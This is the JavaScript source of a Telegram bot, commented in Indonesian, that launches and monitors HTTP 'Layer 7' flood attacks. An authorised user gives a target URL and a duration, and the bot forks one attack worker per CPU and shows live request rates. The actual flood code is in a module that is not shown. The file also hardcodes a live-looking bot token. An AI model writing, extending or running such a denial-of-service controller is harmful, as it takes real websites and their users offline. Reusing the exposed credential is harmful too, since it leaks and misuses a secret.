const TelegramBot = require('node-telegram-bot-api');
const { fork } = require('child_process');
const os = require('os');

const token = '8962044822:AAGNjh-qyQQsFY6SitarRFMzr5DepQOCNmY';

const bot = new TelegramBot(token, { polling: true });

// --- ID PENGGUNA YANG DIIZINKAN ---
// Tambahkan ID numerik Telegram Anda di sini untuk keamanan.
// Anda bisa menambahkan lebih dari satu ID, pisahkan dengan koma.
const AUTHORIZED_USER_IDS = [8710323660];

let isAttackRunning = false;
let workers = [];
let attackTimeout;
let displayInterval;
let attackMessageInfo = null; // Stores { chatId, messageId, targetUrl, duration, startTime }
let lastWorkerError = null;

function createProgressBar(current, total, length = 10) {
    if (current > total) current = total;
    const percentage = total > 0 ? current / total : 0;
    const progress = Math.round(length * percentage);
    const empty = length - progress;
    return `[${'█'.repeat(progress)}${'·'.repeat(empty)}]`;
}

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcomeMessage = `*Selamat Datang di Zenn DDoS Bot!* 🚀

Bot ini dirancang untuk melakukan serangan *Layer 7* dengan metode *NuclearFlood*.

⚠️ *Peringatan:*
Gunakan bot ini dengan tanggung jawab penuh. Penyalahgunaan untuk aktivitas ilegal adalah di luar tanggung jawab pengembang.

👇 Klik tombol di bawah untuk memulai.`;

    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '⚡ Cara Penggunaan', callback_data: 'show_attack_usage' }]
            ]
        },
        parse_mode: 'Markdown'
    };
    bot.sendMessage(chatId, welcomeMessage, opts);
});

bot.onText(/\/attack(?: (.+) (\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const targetUrl = match[1];
    const duration = parseInt(match[2], 10);

    if (!AUTHORIZED_USER_IDS.includes(msg.from.id)) {
        const unauthorizedMessage = `🚫 *Akses Ditolak*\n\nAnda tidak memiliki izin untuk menggunakan perintah ini.`;
        bot.sendMessage(chatId, unauthorizedMessage, { parse_mode: 'Markdown' });
        return;
    }

    if (!targetUrl || !duration) {
        const usageMessage = `⚠️ *Format Perintah Salah*\n\nGunakan format berikut:\n\`/attack <URL> <Durasi>\`\n\n*Contoh:*\n\`/attack https://example.com 120\``;
        bot.sendMessage(chatId, usageMessage, { parse_mode: 'Markdown' });
        return;
    }

    if (isAttackRunning) {
        const busyMessage = `⏳ *Serangan Sedang Berjalan*\n\nHarap tunggu hingga serangan saat ini selesai sebelum memulai yang baru. Anda dapat menghentikannya dengan tombol atau perintah /stop.`;
        bot.sendMessage(chatId, busyMessage, { parse_mode: 'Markdown' });
        return;
    }

    try {
        new URL(targetUrl);
    } catch (e) {
        const invalidUrlMessage = `❌ *URL Tidak Valid*\n\nURL yang Anda masukkan tidak valid. Pastikan formatnya benar, contohnya: \`https://example.com\``;
        bot.sendMessage(chatId, invalidUrlMessage, { parse_mode: 'Markdown' });
        return;
    }

    if (isNaN(duration) || duration <= 0) {
        const invalidDurationMessage = `❌ *Durasi Tidak Valid*\n\nDurasi serangan harus berupa angka positif dalam satuan detik.`;
        bot.sendMessage(chatId, invalidDurationMessage, { parse_mode: 'Markdown' });
        return;
    }

    isAttackRunning = true;
    lastWorkerError = null; // Reset any previous error
    const sentMessage = await bot.sendMessage(chatId, '🚀 Mempersiapkan serangan...', {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🛑 Hentikan Serangan', callback_data: 'stop_attack' }]
            ]
        }
    });

    attackMessageInfo = {
        chatId: chatId,
        messageId: sentMessage.message_id,
        targetUrl: targetUrl,
        duration: duration,
        startTime: Date.now()
    };

    const combinedStats = {
        total: 0,
        success: 0,
        failed: 0,
        phases: {}
    };

    const handleWorkerExit = (pid, code) => {
        // If a worker exits with an error code while the attack is supposed to be running
        if (code !== 0 && isAttackRunning) {
            // Use a small delay to ensure any final error messages from the worker are processed
            // before we declare the attack as failed. This helps prevent a race condition
            // where the 'exit' event is handled before the 'message' event.
            setTimeout(() => {
                // Check again if the attack is still considered running, in case it was stopped
                // by another mechanism in the meantime.
                if (!isAttackRunning) return;

                console.error(`[Bot] Worker PID ${pid} crashed with exit code ${code}. Stopping all workers.`);
                // Stop any remaining workers and cleanup intervals
                clearTimeout(attackTimeout);
                clearInterval(displayInterval);
                workers.forEach(w => w.kill());
                workers = [];
                isAttackRunning = false;

                let errorMessage = `❌ *Serangan Gagal Dimulai*\n\nTerjadi error internal pada proses pekerja. Serangan dihentikan.`;
                if (lastWorkerError) {
                    // Truncate if too long for a telegram message (max 4096 chars)
                    const truncatedError = lastWorkerError.substring(0, 3500);
                    errorMessage += `\n\n*Log Error Lengkap:*\n\`\`\`\n${truncatedError}\n\`\`\``;
                }

                if (attackMessageInfo) {
                    bot.editMessageText(errorMessage, {
                        chat_id: attackMessageInfo.chatId,
                        message_id: attackMessageInfo.messageId,
                        parse_mode: 'Markdown',
                        reply_markup: { inline_keyboard: [] }
                    }).catch(() => {}); // Ignore errors, we are in a failed state anyway
                }
                attackMessageInfo = null;
                lastWorkerError = null;
            }, 200); // 200ms delay should be sufficient
        }
    };

    const numCPUs = os.cpus().length; // Gunakan semua CPU yang tersedia (2 di Railway)

    for (let i = 0; i < numCPUs; i++) {
        const worker = fork('./modules/main.js');
        worker.send({ targetUrl, duration });
        worker.on('message', (message) => {
            if (message.type === 'stats') {
                combinedStats.total += message.data.total;
                combinedStats.success += message.data.success;
                combinedStats.failed += message.data.failed;
                combinedStats.phases[worker.pid] = message.data.phase;
            } else if (message.type === 'error') {
                // Store the last error message from any worker
                lastWorkerError = message.data;
            }
        });
        worker.on('exit', (code) => handleWorkerExit(worker.pid, code));
        workers.push(worker);
    }

    displayInterval = setInterval(() => {
        if (!attackMessageInfo) return;
        const elapsedSeconds = Math.floor((Date.now() - attackMessageInfo.startTime) / 1000);
        const rps = elapsedSeconds > 0 ? (combinedStats.total / elapsedSeconds).toFixed(0) : 0;
        const rate = combinedStats.total > 0 ? (combinedStats.success / combinedStats.total * 100).toFixed(2) : '0.00';
        const activePhases = [...new Set(Object.values(combinedStats.phases))].join(', ');
        const progressBar = createProgressBar(elapsedSeconds, attackMessageInfo.duration, 10);

        const statusText = `🔥 *Serangan Berlangsung* 🔥

🎯 *Target:* \`${attackMessageInfo.targetUrl}\`

⏳ *Waktu:* ${progressBar} ${elapsedSeconds} / ${attackMessageInfo.duration} detik

📈 *Statistik:*
  - *Mode Aktif:* ${activePhases || 'Menginisialisasi...'}
  - *Requests/detik:* ~${rps}
  - *Total Requests:* ${combinedStats.total}
  - *Sukses:* ${combinedStats.success}
  - *Gagal:* ${combinedStats.failed}
  - *Tingkat Sukses:* ${rate}%`;

        bot.editMessageText(statusText, {
            chat_id: attackMessageInfo.chatId,
            message_id: attackMessageInfo.messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🛑 Hentikan Serangan', callback_data: 'stop_attack' }]
                ]
            }
        }).catch(() => {}); // Abaikan error jika pesan tidak berubah atau terlalu sering diedit

    }, 1500); // Update setiap 1.5 detik untuk menghindari rate limit Telegram

    // Atur timeout untuk menghentikan semua worker setelah durasi yang ditentukan
    attackTimeout = setTimeout(() => {
        clearInterval(displayInterval);
        const finalRate = (combinedStats.total > 0 ? (combinedStats.success / combinedStats.total * 100) : 0).toFixed(2);
        const finalStatusText = `✅ *Serangan Selesai* ✅
🎯 *Target:* \`${attackMessageInfo.targetUrl}\`
⏱️ *Total Durasi:* ${attackMessageInfo.duration} detik

📊 *Ringkasan Akhir:*
  - *Total Requests:* ${combinedStats.total}
  - *Tingkat Sukses:* ${finalRate}%`;

        if (attackMessageInfo) {
            bot.editMessageText(finalStatusText, { 
                chat_id: attackMessageInfo.chatId, 
                message_id: attackMessageInfo.messageId, 
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: [] } // Hapus tombol setelah selesai
            }).catch(() => {});
        }
        workers.forEach(worker => worker.kill());
        workers = [];
        isAttackRunning = false;
        attackMessageInfo = null;
    }, (duration + 2) * 1000); // Beri buffer 2 detik untuk laporan terakhir
});

bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;

    if (!AUTHORIZED_USER_IDS.includes(msg.from.id)) {
        const unauthorizedMessage = `🚫 *Akses Ditolak*\n\nAnda tidak memiliki izin untuk menggunakan perintah ini.`;
        bot.sendMessage(chatId, unauthorizedMessage, { parse_mode: 'Markdown' });
        return;
    }

    if (isAttackRunning) {
        clearTimeout(attackTimeout);
        clearInterval(displayInterval);
        workers.forEach(worker => worker.kill());
        workers = [];
        isAttackRunning = false;

        const stopMessage = `🛑 *Serangan Dihentikan Manual* 🛑

Serangan terhadap \`${attackMessageInfo.targetUrl}\` telah dihentikan secara paksa.`;

        if (attackMessageInfo) {
            bot.editMessageText(stopMessage, {
                chat_id: attackMessageInfo.chatId,
                message_id: attackMessageInfo.messageId,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: [] } // Hapus tombol saat dihentikan
            }).catch(() => {
                // Jika edit gagal (misal pesan terlalu lama), kirim pesan baru
                bot.sendMessage(chatId, stopMessage, { parse_mode: 'Markdown' });
            });
        } else {
            bot.sendMessage(chatId, '🛑 Serangan telah dihentikan secara manual.');
        }
        attackMessageInfo = null;
    } else {
        const noAttackMessage = `ℹ️ *Tidak Ada Serangan Aktif*\n\nSaat ini tidak ada serangan yang sedang berjalan.`;
        bot.sendMessage(chatId, noAttackMessage, { parse_mode: 'Markdown' });
    }
});

bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = msg.chat.id;
    const fromId = callbackQuery.from.id;

    if (data === 'show_attack_usage') {
        bot.answerCallbackQuery(callbackQuery.id);
        const usageMessage = `*Cara Menggunakan Perintah Serangan* ⚡\n\nGunakan format berikut di chat:\n\`/attack <URL> <Durasi>\`\n\n*Contoh:*\n\`/attack https://example.com 120\`\n\n- \`<URL>\`: Alamat situs web target.\n- \`<Durasi>\`: Lama serangan dalam detik.`;
        bot.sendMessage(msg.chat.id, usageMessage, { parse_mode: 'Markdown' });
        return;
    }

    if (data === 'stop_attack') {
        if (!AUTHORIZED_USER_IDS.includes(fromId)) {
            bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Akses Ditolak', show_alert: true });
            return;
        }

        if (isAttackRunning) {
            bot.answerCallbackQuery(callbackQuery.id, { text: '🛑 Menghentikan serangan...' });

            clearTimeout(attackTimeout);
            clearInterval(displayInterval);
            workers.forEach(worker => worker.kill());
            workers = [];
            isAttackRunning = false;

            const stopMessage = `🛑 *Serangan Dihentikan Manual* 🛑\n\nSerangan terhadap \`${attackMessageInfo.targetUrl}\` telah dihentikan secara paksa.`;

            if (attackMessageInfo) {
                bot.editMessageText(stopMessage, {
                    chat_id: attackMessageInfo.chatId,
                    message_id: attackMessageInfo.messageId,
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [] } // Hapus tombol
                }).catch(() => {});
            }
            attackMessageInfo = null;
        } else {
            bot.answerCallbackQuery(callbackQuery.id, { text: 'ℹ️ Tidak ada serangan aktif untuk dihentikan.' });
            // Hapus tombol jika masih ada
            bot.editMessageText(msg.text, { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [] } }).catch(()=>{});
        }
        return;
    }
});

console.log('Telegram bot is listening for commands...');